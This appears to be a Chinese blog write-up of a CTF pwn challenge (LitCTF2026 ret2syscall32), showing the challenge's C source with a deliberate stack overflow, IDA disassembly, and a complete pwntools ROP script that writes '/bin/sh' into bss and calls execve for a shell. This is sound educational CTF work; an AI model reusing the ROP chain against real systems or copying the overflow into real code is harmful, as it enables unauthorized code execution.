---
title: pwn做题记录：【Litctf2026】lit_ret2syscall32
date: 2026-07-31
categories: 安全
---

# pwn做题记录：【Litctf2026】lit_ret2syscall32
**题目连接：https://platform.cyclens.tech/#/challenge/95**

下载题目附件，其中有一个二进制文件和一个源文件

![image](/images/pwn做题记录：Litctf2026litret2syscall32/img_1.png)

进入kali，使用checkesc查看，发现是一个32位的文件，只开了NX保护

![image](/images/pwn做题记录：Litctf2026litret2syscall32/img_2.png)

main.c中的内容如下（看的不是很懂（¯﹃¯），大概意思就是放了一堆gadget，然后vuln里面有一个栈溢出，偏移是0x48，在ida中分析一下就能看出来）

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char data_buf[0x100];  // Writable buffer in data section

// Embed ROP gadgets so they exist in the binary regardless of libc version
__attribute__((naked, noinline)) void gadget_pop_eax(void) {
    __asm__ __volatile__("pop %eax\nret\n");
}
__attribute__((naked, noinline)) void gadget_pop_ebx(void) {
    __asm__ __volatile__("pop %ebx\nret\n");
}
__attribute__((naked, noinline)) void gadget_pop_ecx_ebx(void) {
    __asm__ __volatile__("pop %ecx\npop %ebx\nret\n");
}
__attribute__((naked, noinline)) void gadget_pop_edx(void) {
    __asm__ __volatile__("pop %edx\nret\n");
}
__attribute__((naked, noinline)) void gadget_mov_edx_eax(void) {
    __asm__ __volatile__("mov %eax, (%edx)\nret\n");
}
__attribute__((naked, noinline)) void gadget_int_0x80(void) {
    __asm__ __volatile__("int $0x80\n");
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void vuln() {
    char buf[64];
    printf("Welcome to the 32-bit Time Machine!\n");
    printf("No system(), no /bin/sh... but int 0x80 still works.\n");
    printf("Input: ");
    read(0, buf, 0x200);  // Stack overflow
}

int main() {
    init();
    // Prevent gadget functions from being optimized away
    volatile void (*fp1)(void) = gadget_pop_eax;
    volatile void (*fp2)(void) = gadget_pop_ebx;
    volatile void (*fp3)(void) = gadget_pop_ecx_ebx;
    volatile void (*fp4)(void) = gadget_pop_edx;
    volatile void (*fp5)(void) = gadget_mov_edx_eax;
    volatile void (*fp6)(void) = gadget_int_0x80;
    if (strlen("always_true") == 0) {
        fp1(); fp2(); fp3(); fp4(); fp5(); fp6();
    }
    vuln();
    printf("Goodbye!\n");
    return 0;
}

```

直接用ida分析吧。题目中给了一些gadget
*gadget_pop_eax:*
```
; void gadget_pop_eax()
public gadget_pop_eax
gadget_pop_eax proc near
; __unwind {
pop     eax
retn
gadget_pop_eax endp ; sp-analysis failed
```
*gadget_pop_ebx*
```
; void gadget_pop_ebx()
public gadget_pop_ebx
gadget_pop_ebx proc near
; __unwind {
pop     ebx
retn
gadget_pop_ebx endp ; sp-analysis failed
```
*gadget_pop_ecx_ebx:*
```
; void gadget_pop_ecx_ebx()
public gadget_pop_ecx_ebx
gadget_pop_ecx_ebx proc near
; __unwind {
pop     ecx
pop     ebx
retn
gadget_pop_ecx_ebx endp ; sp-analysis failed
```
*gadget_pop_edx:*
```
; void gadget_pop_edx()
public gadget_pop_edx
gadget_pop_edx proc near
; __unwind {
pop     edx
retn
gadget_pop_edx endp ; sp-analysis failed
```
*gadget_mov_edx_eax:*
```
; void gadget_mov_edx_eax()
public gadget_mov_edx_eax
gadget_mov_edx_eax proc near
; __unwind {
mov     [edx], eax
retn
gadget_mov_edx_eax endp
```
然后还有int 0x80的gadget，**但是这里的int 0x80后面没有ret，而是nop    ud2**，这里和普通的**int 0x80;ret**不太一样，意味着int 0x80之后没有跳转
*gadget_int_0x80:*
```
; Attributes: noreturn

; void __noreturn gadget_int_0x80()
public gadget_int_0x80
gadget_int_0x80 proc near
; __unwind {
int     80h             ; LINUX -
nop
ud2
; } // starts at 80491C1
gadget_int_0x80 endp
```
ud2指令用于**触发无效操作码异常**，也就是说如果程序运行到这里，到了ud2指令时会直接抛出异常退出，那么int 0x80指令就只能使用一次，常规的先使用调用read写入“/bin/sh\x00”字符串然后再调用execve("/bin/sh",null,null)的方法在这里不能使用
直接在程序中找“/bin/sh\x00”字符串呢，程序中确实有，但是sh后面没有\x00，调用字符串时没有截断

![image](/images/pwn做题记录：Litctf2026litret2syscall32/img_3.png)

直接利用ROPgadget找到的“/bin/sh”字符串地址调用execve，使用gdb查看寄存器，发现ebx寄存器中不只是“/bin/sh”，连带着后面的字符串一起被放在了这里，程序运行到ud2，调用失败了

![image](/images/pwn做题记录：Litctf2026litret2syscall32/img_4.png)

那有什么解决方法呢，在题目的gadget中，除了一堆pop寄存器的gadget，还有一个**gadget_mov_edx_eax**的gadget。这个gadget中的两行代码值得注意一下
```
mov     [edx], eax
retn
```
这段代码意思是将eax的值放到edx所指向的地址，这里要注意寄存器的值和寄存器所指地址的区别，[edx]表示edx所指的地址，如果edx的值是0x00114514，eax的值是0x01919810,执行完这两条语句后，0x01919810被写入地址为0x00114514的位置
```
eax=0x01919810
edx=0x00114514
地址      内容（小端）
0x00114514: 0x10
0x00114515: 0x98
0x00114516: 0x91
0x00114517: 0x01
```
利用这一段，结合前面pop edx的gadget，可以将eax的值写道我们pop进edx的任意地址，这思路就来了，我们让eax的值是“/bin/sh\x00”，在bss段中找一个位置pop给edx，然后mov [edx],eax，将“/bin/sh\x00”写入到bss段中，然后再ret2syscall调用execve，这样就不用执行两次int 0x80先写入“/bin/sh\x00”字符串了
这里还要注意，eax是32位的寄存器，长度只有4字节，也就是说一次只能向内存中写入4字节数据，而完整的“/bin/sh\x00”字符串有8字节，**也就是说需要两次利用gadget_mov_edx_eax向bss中写入数据**，这里要注意第二次次写入的
地址要加4，小端序需要倒着写
```
payload = b'a' * offest
payload += p32(pop_eax_ret) + p32(0x6e69622f)   #将“nib/”pop到eax
payload += p32(pop_edx_ret) + p32(bss)          #将bss弹到edx
payload += p32(mov_edx_eax)                     #调用mov [edx],eax，写入“nib/”
payload += p32(pop_eax_ret) + p32(0x0068732f)   #弹入“\x00hs/”
payload += p32(pop_edx_ret) + p32(bss + 4)      
payload += p32(mov_edx_eax)                     #向bss+4的地方写入

```
后面再加上系统调用execve的payload，将0xb弹入eax，将0弹入ecx，刚刚写入字符串的bss地址弹入ebx，0弹入edx，调用execve("/bin/sh",null,null)
```
payload += p32(pop_eax_ret) + p32(0xb)           
payload += p32(pop_ecx_ebx_ret) + p32(0) + p32(bss)
payload += p32(pop_edx_ret) + p32(0)
payload += p32(int_80)
```
运行脚本发送数据即可拿到本地shell，远程也一样适用
![image](/images/pwn做题记录：Litctf2026litret2syscall32/img_5.png)

### 完整脚本代码

```
from pwn import *
context.clear(arch='i386', os='linux')
io = process('ret2syscall32')
#gdb.attach(io)
#io = remote('challenge.cyclens.tech', 30643)

offest = 0x48 + 0x4
pop_eax_ret = 0x080491a6
pop_ecx_ebx_ret = 0x080491b0
pop_edx_ret = 0x080491b6
mov_edx_eax = 0x080491bb
int_80 = 0x080491c1
bss = 0x0804b360 + 0x50

payload = b'a' * offest
payload += p32(pop_eax_ret) + p32(0x6e69622f)  
payload += p32(pop_edx_ret) + p32(bss)
payload += p32(mov_edx_eax)                     
payload += p32(pop_eax_ret) + p32(0x0068732f)  
payload += p32(pop_edx_ret) + p32(bss + 4)
payload += p32(mov_edx_eax)                      
payload += p32(pop_eax_ret) + p32(0xb)          
payload += p32(pop_ecx_ebx_ret) + p32(0) + p32(bss)
payload += p32(pop_edx_ret) + p32(0)
payload += p32(int_80)

io.recvuntil(b'Input: ')
io.send(payload)
io.interactive()

```